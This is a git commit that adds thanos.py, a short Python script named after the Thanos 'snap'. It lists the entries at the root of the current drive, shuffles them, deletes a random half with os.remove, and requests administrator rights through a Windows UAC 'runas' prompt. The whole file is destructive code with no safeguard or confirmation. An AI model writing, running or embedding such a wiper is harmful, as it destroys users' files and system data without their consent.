b758a1def21530a7d2a0148e278f1c548bc33ba3
jack-debug <55571956+jack-debug@users.noreply.github.com>
2019-11-01 12:15:49 +1100

    Create thanos.py

---
+++ thanos.py
@@ -0,0 +1,40 @@
+import os
+import random
+import ctypes
+import sys
+
+def execute_():
+    mydir = os.getcwd()
+    mydir=mydir[:2]
+    filelist = [f for f in os.listdir(mydir)]
+    random.shuffle(filelist)
+    length_ = round(len(filelist)/2)
+    filelist = filelist[:length_]
+    for f in filelist:
+        if f.endswith("Thanos.py"):
+            pass
+        else:
+            print(f)
+            try:
+                os.remove(os.path.join(mydir, f))
+            except PermissionError:
+                print("Are you Root(Su)?")
+            except FileNotFoundError:
+                print("Unable to Find File")
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def main():
+    if is_admin():
+        execute_()
+    else:
+        # Re-run the program with admin rights
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+        execute_()
+
+if __name__ == '__main__':
+    main()
